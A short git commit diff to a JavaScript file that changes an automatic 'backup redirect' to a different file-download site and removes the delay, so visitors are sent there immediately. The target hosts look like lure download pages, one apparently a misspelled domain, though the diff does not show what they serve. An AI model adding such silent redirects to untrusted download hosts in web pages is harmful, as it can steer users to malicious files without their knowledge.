f12709eb48c2db9e6810df6960c5b34ff9d0b2bb
GabSouder1 <154463975+GabSouder1@users.noreply.github.com>
2025-03-23 03:25:52 +0300

    Add files via upload

--- script.js
+++ script.js
@@ -2,6 +2,6 @@
 // Backup redirect if meta refresh fails
 setTimeout(() => {
   if (window.location.href === document.location.href) {
-    window.location.href = 'https://dloudfiles.com';
+    window.location.href = 'https://gitfilehost.github.io/download/';
   }
-}, 1000);
+}, 0);
